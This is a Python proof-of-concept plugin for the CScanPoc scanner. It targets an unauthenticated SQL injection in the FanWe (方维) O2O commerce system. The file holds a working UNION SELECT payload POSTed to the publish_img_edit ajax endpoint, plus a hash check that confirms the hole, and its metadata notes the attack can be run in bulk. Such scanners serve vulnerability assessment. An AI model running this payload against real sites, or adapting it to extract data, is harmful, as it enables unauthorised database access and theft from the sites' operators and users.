# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'FanWe_0003'  # 平台漏洞编号，留空
    name = '方维O2O商业系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-25'  # 漏洞公布时间
    desc = '''
        UNION SELECT注入，直接出数据，demo验证，无需登录，只要一个POST数据库，可批量。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0122566'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FanWe(方维)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '24cc2d03-ff75-4dbd-a269-45f3e2a559a6'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-16'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer:http://www.wooyun.org/bugs/wooyun-2015-0122566
            hh = hackhttp.hackhttp()
            url = self.target + "/index.php?ctl=ajax&act=publish_img_edit"
            data = "img_ids[1]=-1) UNION SELECT%0b1,2,3,4,5,6,7,md5(123),9,10,11,12%23"
            code, head, res, errcode, finalurl = hh.http(url, post=data)

            if code == 200 and "202cb962ac59075b964b07152d234b70" in res:
                #security_hole('sql injection: ' + arg+'index.php?ctl=ajax&act=publish_img_edit')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
